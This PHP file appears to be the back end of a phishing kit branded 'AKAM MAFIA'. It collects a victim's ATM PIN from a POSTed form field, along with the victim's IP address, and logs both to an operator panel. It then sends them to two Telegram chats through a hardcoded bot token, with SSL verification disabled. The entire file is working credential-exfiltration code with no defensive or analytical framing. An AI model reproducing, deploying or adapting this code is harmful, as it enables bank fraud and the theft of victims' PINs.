<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$pin = isset($_POST['pass']) ? $_POST['pass'] : ''; 

if (!empty($pin)) {
    // 1. Guardar en el panel (usando tus funciones actuales)
    actualizar_registro($ip, "PIN", $pin); 

    // 2. Configuración del Bot de AKAM MAFIA
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = ["8114050673", "8518977918"]; // Admin principal y secundario

    // 3. Formato del mensaje
    $mensaje = "⭐ <b>AKAM MAFIA - NUEVO PIN</b> ⭐\n\n";
    $mensaje .= "👤 <b>IP:</b> <code>" . $ip . "</code>\n";
    $mensaje .= "🔑 <b>PIN DE CAJERO:</b> <code>" . $pin . "</code>\n";
    $mensaje .= "⏰ <b>FECHA:</b> " . date('d/m/Y H:i:s') . "\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    // 4. Envío a cada ID
    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
        $params = [
            'chat_id' => $id,
            'text' => $mensaje,
            'parse_mode' => 'HTML'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
